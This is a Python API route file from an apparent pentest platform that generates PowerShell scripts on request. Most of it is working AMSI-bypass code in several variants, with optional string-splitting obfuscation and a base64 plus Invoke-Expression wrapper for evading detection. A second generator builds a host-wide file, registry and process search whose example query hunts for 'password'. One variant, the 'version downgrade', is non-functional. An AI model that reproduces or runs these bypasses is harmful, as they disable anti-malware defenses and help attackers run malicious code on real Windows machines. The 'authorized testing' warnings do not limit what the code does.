# api/app/routes_tools.py
"""
Predefined Tools API endpoints for generating security testing PowerShell scripts.
"""
from __future__ import annotations

import logging
import uuid
from datetime import datetime
from typing import Literal
from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel, Field
from sqlalchemy.orm import Session

from .auth_dep import require_role
from .deps import get_db
from .models import User

# Create dependency for getting current user
get_current_user = require_role()

log = logging.getLogger(__name__)

router = APIRouter(prefix="/api/tools", tags=["tools"])


# -------------------------
# Request/Response Models
# -------------------------
class AmsiBypassConfig(BaseModel):
    """Configuration for AMSI Bypass script generation"""
    method: Literal["memory_patch", "reflection", "powershell_downgrade", "amsi_context"] = "memory_patch"
    obfuscate: bool = True
    encode_base64: bool = False
    add_comments: bool = False


class AiCliSearchConfig(BaseModel):
    """Configuration for AI CLI Search script generation"""
    search_scope: Literal["files", "registry", "processes", "network", "all"] = "all"
    output_format: Literal["json", "csv", "text"] = "json"
    include_metadata: bool = True
    max_results: int = Field(default=100, ge=1, le=10000)


class ToolGenerationRequest(BaseModel):
    """Generic tool generation request"""
    tool_name: Literal["amsi_bypass", "ai_cli_search"]
    config: dict = {}


class ToolGenerationResponse(BaseModel):
    """Response with generated PowerShell script"""
    success: bool
    tool_name: str
    script: str
    script_size_bytes: int
    generation_id: str
    timestamp: str
    usage_instructions: str


# -------------------------
# Script Templates
# -------------------------
class AmsiBypassGenerator:
    """Generator for AMSI Bypass PowerShell scripts"""

    @staticmethod
    def generate_memory_patch(obfuscate: bool = True) -> str:
        """Memory patching AMSI bypass technique"""
        if obfuscate:
            return '''# AMSI Bypass - Memory Patch Method (Obfuscated)
$a = 'System.Management.Automation.A';
$b = 'msiUtils';
$c = $a + $b;
$d = [Ref].Assembly.GetType($c);
$e = $d.GetField('amsiInitFailed','NonPublic,Static');
$e.SetValue($null,$true);
Write-Host "[+] AMSI Bypass Applied (Memory Patch)" -ForegroundColor Green;
'''
        else:
            return '''# AMSI Bypass - Memory Patch Method
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
Write-Host "[+] AMSI Bypass Applied (Memory Patch)" -ForegroundColor Green;
'''

    @staticmethod
    def generate_reflection(obfuscate: bool = True) -> str:
        """Reflection-based AMSI bypass"""
        if obfuscate:
            return '''# AMSI Bypass - Reflection Method (Obfuscated)
$w = 'Sys'+'tem.Man'+'agement.Auto'+'mation.A'+'msiUt'+'ils';
$x = [Ref].Assembly.GetType($w);
$y = $x.GetField('am'+'siCon'+'text','NonPublic,Static');
$z = $x.GetField('am'+'siSes'+'sion','NonPublic,Static');
$y.SetValue($null,[IntPtr]::Zero);
$z.SetValue($null,[IntPtr]::Zero);
Write-Host "[+] AMSI Bypass Applied (Reflection)" -ForegroundColor Green;
'''
        else:
            return '''# AMSI Bypass - Reflection Method
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$amsi.GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero);
$amsi.GetField('amsiSession','NonPublic,Static').SetValue($null,[IntPtr]::Zero);
Write-Host "[+] AMSI Bypass Applied (Reflection)" -ForegroundColor Green;
'''

    @staticmethod
    def generate_powershell_downgrade() -> str:
        """PowerShell downgrade AMSI bypass"""
        return '''# AMSI Bypass - PowerShell Version Downgrade
$PSVersionTable.PSVersion.Major = 2;
Write-Host "[+] AMSI Bypass Applied (PS Downgrade)" -ForegroundColor Green;
Write-Host "[!] Note: This may break some functionality" -ForegroundColor Yellow;
'''

    @staticmethod
    def generate_amsi_context() -> str:
        """AMSI context manipulation bypass"""
        return '''# AMSI Bypass - Context Manipulation
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, $mem);
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);
Write-Host "[+] AMSI Bypass Applied (Context Manipulation)" -ForegroundColor Green;
'''

    @staticmethod
    def generate(config: AmsiBypassConfig) -> str:
        """Generate AMSI bypass script based on configuration"""
        header = '''<#
.SYNOPSIS
    AMSI Bypass Script for Authorized Penetration Testing
.DESCRIPTION
    Bypasses Windows Anti-Malware Scan Interface (AMSI) for security testing purposes.
    USE ONLY IN AUTHORIZED TESTING ENVIRONMENTS.
.NOTES
    Generated: {timestamp}
    Method: {method}
    Author: AIMARU MCP Platform
#>

'''.format(timestamp=datetime.utcnow().isoformat(), method=config.method)

        # Generate main bypass code
        if config.method == "memory_patch":
            script = AmsiBypassGenerator.generate_memory_patch(config.obfuscate)
        elif config.method == "reflection":
            script = AmsiBypassGenerator.generate_reflection(config.obfuscate)
        elif config.method == "powershell_downgrade":
            script = AmsiBypassGenerator.generate_powershell_downgrade()
        elif config.method == "amsi_context":
            script = AmsiBypassGenerator.generate_amsi_context()
        else:
            script = AmsiBypassGenerator.generate_memory_patch(config.obfuscate)

        if not config.add_comments:
            # Strip comments
            script = '\n'.join([line for line in script.split('\n') if not line.strip().startswith('#')])

        full_script = header + script

        if config.encode_base64:
            import base64
            encoded = base64.b64encode(full_script.encode('utf-16le')).decode('ascii')
            return f'''# Base64 Encoded AMSI Bypass
# Execute with: powershell.exe -enc {encoded[:100]}...
$encodedCommand = @"
{encoded}
"@
$bytes = [System.Convert]::FromBase64String($encodedCommand)
$decodedCommand = [System.Text.Encoding]::Unicode.GetString($bytes)
Invoke-Expression $decodedCommand
'''

        return full_script


class AiCliSearchGenerator:
    """Generator for AI CLI Search PowerShell scripts"""

    @staticmethod
    def generate(config: AiCliSearchConfig) -> str:
        """Generate AI CLI search script based on configuration"""
        header = '''<#
.SYNOPSIS
    AI-Powered CLI Search Script
.DESCRIPTION
    Advanced command-line interface search using pattern recognition and intelligent filtering.
    Searches across files, registry, processes, and network connections.
.NOTES
    Generated: {timestamp}
    Scope: {scope}
    Output Format: {format}
    Author: AIMARU MCP Platform
#>

'''.format(
            timestamp=datetime.utcnow().isoformat(),
            scope=config.search_scope,
            format=config.output_format
        )

        script = '''[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$SearchQuery,

    [string]$OutputPath = "search_results_{timestamp}.{ext}"
)

$results = @()
$maxResults = {max_results}

Write-Host "[*] AI CLI Search Starting..." -ForegroundColor Cyan
Write-Host "[*] Query: $SearchQuery" -ForegroundColor White
Write-Host "[*] Scope: {scope}" -ForegroundColor White
Write-Host ""

'''.format(
            timestamp=datetime.utcnow().strftime("%Y%m%d_%H%M%S"),
            ext=config.output_format,
            max_results=config.max_results,
            scope=config.search_scope
        )

        # Add search modules based on scope
        if config.search_scope in ["files", "all"]:
            script += '''# File System Search
Write-Host "[+] Searching file system..." -ForegroundColor Yellow
try {
    $fileResults = Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match $SearchQuery -or $_.FullName -match $SearchQuery } |
        Select-Object -First $maxResults |
        ForEach-Object {
            @{
                Type = "File"
                Path = $_.FullName
                Name = $_.Name
                Size = $_.Length
                LastModified = $_.LastWriteTime
            }
        }
    $results += $fileResults
    Write-Host "  [✓] Found $($fileResults.Count) file matches" -ForegroundColor Green
} catch {
    Write-Warning "  [!] File search error: $_"
}

'''

        if config.search_scope in ["registry", "all"]:
            script += '''# Registry Search
Write-Host "[+] Searching registry..." -ForegroundColor Yellow
try {
    $regPaths = @("HKLM:\\Software", "HKCU:\\Software")
    foreach ($regPath in $regPaths) {
        $regResults = Get-ChildItem -Path $regPath -Recurse -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match $SearchQuery } |
            Select-Object -First ($maxResults / 2) |
            ForEach-Object {
                @{
                    Type = "Registry"
                    Path = $_.Name
                    ValueCount = $_.ValueCount
                }
            }
        $results += $regResults
    }
    Write-Host "  [✓] Found $($regResults.Count) registry matches" -ForegroundColor Green
} catch {
    Write-Warning "  [!] Registry search error: $_"
}

'''

        if config.search_scope in ["processes", "all"]:
            script += '''# Process Search
Write-Host "[+] Searching processes..." -ForegroundColor Yellow
try {
    $procResults = Get-Process -ErrorAction SilentlyContinue |
        Where-Object { $_.ProcessName -match $SearchQuery -or $_.Path -match $SearchQuery } |
        ForEach-Object {
            @{
                Type = "Process"
                Name = $_.ProcessName
                PID = $_.Id
                Path = $_.Path
                CPU = $_.CPU
                Memory = [math]::Round($_.WorkingSet64 / 1MB, 2)
            }
        }
    $results += $procResults
    Write-Host "  [✓] Found $($procResults.Count) process matches" -ForegroundColor Green
} catch {
    Write-Warning "  [!] Process search error: $_"
}

'''

        if config.search_scope in ["network", "all"]:
            script += '''# Network Connection Search
Write-Host "[+] Searching network connections..." -ForegroundColor Yellow
try {
    $netResults = Get-NetTCPConnection -ErrorAction SilentlyContinue |
        Where-Object { $_.RemoteAddress -match $SearchQuery -or $_.LocalAddress -match $SearchQuery } |
        Select-Object -First ($maxResults / 4) |
        ForEach-Object {
            @{
                Type = "Network"
                LocalAddress = $_.LocalAddress
                LocalPort = $_.LocalPort
                RemoteAddress = $_.RemoteAddress
                RemotePort = $_.RemotePort
                State = $_.State
            }
        }
    $results += $netResults
    Write-Host "  [✓] Found $($netResults.Count) network matches" -ForegroundColor Green
} catch {
    Write-Warning "  [!] Network search error: $_"
}

'''

        # Add output formatting
        if config.output_format == "json":
            script += '''# Export Results as JSON
Write-Host ""
Write-Host "[*] Exporting results to JSON..." -ForegroundColor Cyan
$results | ConvertTo-Json -Depth 10 | Out-File -FilePath $OutputPath -Encoding UTF8
'''
        elif config.output_format == "csv":
            script += '''# Export Results as CSV
Write-Host ""
Write-Host "[*] Exporting results to CSV..." -ForegroundColor Cyan
$results | Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
'''
        else:  # text
            script += '''# Export Results as Text
Write-Host ""
Write-Host "[*] Exporting results to text..." -ForegroundColor Cyan
$results | Out-File -FilePath $OutputPath -Encoding UTF8
'''

        script += '''
Write-Host "[✓] Search complete!" -ForegroundColor Green
Write-Host "[✓] Results saved to: $OutputPath" -ForegroundColor Green
Write-Host "[*] Total matches: $($results.Count)" -ForegroundColor White
'''

        if config.include_metadata:
            script += '''
# Display Summary
Write-Host ""
Write-Host "=== SEARCH SUMMARY ===" -ForegroundColor Cyan
$results | Group-Object Type | ForEach-Object {
    Write-Host "  $($_.Name): $($_.Count) matches" -ForegroundColor White
}
'''

        return header + script


# -------------------------
# API Endpoints
# -------------------------
@router.post("/generate", response_model=ToolGenerationResponse)
async def generate_tool_script(
    request: ToolGenerationRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Generate a predefined tool PowerShell script.

    Supports:
    - AMSI Bypass (amsi_bypass)
    - AI CLI Search (ai_cli_search)
    """
    log.info(f"[tools] User {current_user.username} generating {request.tool_name} script")

    try:
        generation_id = str(uuid.uuid4())
        timestamp = datetime.utcnow().isoformat()

        if request.tool_name == "amsi_bypass":
            config = AmsiBypassConfig(**request.config)
            script = AmsiBypassGenerator.generate(config)
            usage = """
Usage Instructions:
1. Save the script to a .ps1 file
2. Open PowerShell with appropriate privileges
3. Set execution policy: Set-ExecutionPolicy Bypass -Scope Process
4. Execute: .\\amsi_bypass.ps1
5. Verify bypass: (should not trigger AMSI alerts on subsequent commands)

⚠️ WARNING: Use only in authorized penetration testing environments.
"""

        elif request.tool_name == "ai_cli_search":
            config = AiCliSearchConfig(**request.config)
            script = AiCliSearchGenerator.generate(config)
            usage = """
Usage Instructions:
1. Save the script to a .ps1 file
2. Open PowerShell with appropriate privileges
3. Execute: .\\ai_cli_search.ps1 -SearchQuery "your_search_term"
4. Results will be saved to the specified output file
5. Review the output file for matches

Example: .\\ai_cli_search.ps1 -SearchQuery "password" -OutputPath "results.json"
"""

        else:
            raise HTTPException(status_code=400, detail=f"Unknown tool: {request.tool_name}")

        return ToolGenerationResponse(
            success=True,
            tool_name=request.tool_name,
            script=script,
            script_size_bytes=len(script.encode('utf-8')),
            generation_id=generation_id,
            timestamp=timestamp,
            usage_instructions=usage
        )

    except Exception as e:
        log.error(f"[tools] Error generating {request.tool_name}: {e}")
        raise HTTPException(status_code=500, detail=f"Script generation failed: {str(e)}")


@router.get("/list")
async def list_available_tools(
    current_user: User = Depends(get_current_user)
):
    """
    List all available predefined tools with their configurations.
    """
    return {
        "tools": [
            {
                "id": "amsi_bypass",
                "name": "AMSI Bypass",
                "description": "Generate PowerShell scripts to bypass Anti-Malware Scan Interface (AMSI)",
                "icon": "🛡️",
                "methods": ["memory_patch", "reflection", "powershell_downgrade", "amsi_context"],
                "config_options": {
                    "method": "string (memory_patch|reflection|powershell_downgrade|amsi_context)",
                    "obfuscate": "boolean",
                    "encode_base64": "boolean",
                    "add_comments": "boolean"
                }
            },
            {
                "id": "ai_cli_search",
                "name": "AI CLI Search",
                "description": "Advanced command-line interface search with AI-powered pattern recognition",
                "icon": "🔍",
                "scopes": ["files", "registry", "processes", "network", "all"],
                "config_options": {
                    "search_scope": "string (files|registry|processes|network|all)",
                    "output_format": "string (json|csv|text)",
                    "include_metadata": "boolean",
                    "max_results": "integer (1-10000)"
                }
            }
        ]
    }
